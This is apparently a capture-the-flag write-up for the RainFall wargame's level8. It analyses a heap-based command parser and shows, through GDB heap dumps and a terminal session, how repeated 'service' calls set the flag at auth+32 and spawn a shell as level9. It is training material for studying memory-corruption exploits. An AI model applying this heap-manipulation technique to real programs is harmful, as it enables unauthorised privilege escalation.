# This program is a micro-parser.
# It can detect a few commands :
# 	- "auth ":
#	the program will allocate space for a pointer on the heap and copy up to
#	30 characters in the global variable named "auth". This variable
# 	is probably a structure, because of the check made before the call to system,
#	at the offset *(auth + 32). This could imply auth is comprised of a 32 bytes
#	buffer, followed by an integer.
#
#	- "service":
#	the program will duplicate every character in the input buffer after
#	"service" onto the heap.
#
#	- "reset":
#	the program will free the auth pointer.
#
#	- "login":
#	the program will check if the value located at *(auth + 32) is non-zero. If
#	it is the case, a shell is spawned, otherwise the program prints
#	"Password\n" and waits for another command.

# So basically, if we use auth and/or service, their address on the heap will
# be displayed after each command we input.
# An obvious bug here is that if we use auth and service one after the other,
# we can see this behavior :

auth
0x804a008, (nil)

Breakpoint 1, 0x08048596 in main ()
0x804a000:	0x00000000	0x00000011	0x0000000a	<== '\n' 0x00000000
0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000

serviceAAA
0x804a008, 0x804a018

Breakpoint 1, 0x08048596 in main ()
0x804a000:	0x00000000	0x00000011	0x0000000a	0x00000000 <== auth
0x804a010:	0x00000000	0x00000011	0x0a414141	0x00000000 <== serviceAAA
0x804a020:	0x00000000	0x00020fe1	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000

login
Password:
0x804a008, 0x804a018

Breakpoint 1, 0x08048596 in main ()
0x804a000:	0x00000000	0x00000011	0x0000000a	<== auth 0x00000000
0x804a010:	0x00000000	0x00000011	0x0a414141	<== serviceAAA 0x00000000
0x804a020:	0x00000000	0x00020fe1	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000

serviceAAA
0x804a008, 0x804a028

Breakpoint 1, 0x08048596 in main ()
0x804a000:	0x00000000	0x00000011	0x0000000a <== auth 0x00000000
0x804a010:	0x00000000	0x00000011	0x0a414141 <== serviceAAA 0x00000000
0x804a020:	0x00000000	0x00000011	0x0a414141 <== serviceAAA 0x00000000
0x804a030:	0x00000000	0x00020fd1	0x00000000  0x00000000

# We know from analyzing the disassembly of the main function that there is a
# check made at the offset *(auth + 32), this can be exploited by making
# several calls to service until the 32nd byte after 0x804a008 is non-zero.
# Another way of doing it is to exploit the fact that the strdup done after
# service has no bound, whereas the strcpy from the auth command has a limit of
# 30 bytes.
# Here is the solution (auth is followed by a space !) :

level8@RainFall:~$ ./level8
(nil), (nil)
auth 
0x804a008, (nil)
serviceAAA
0x804a008, 0x804a018
serviceAAA
0x804a008, 0x804a028
login
$ whoami
level9
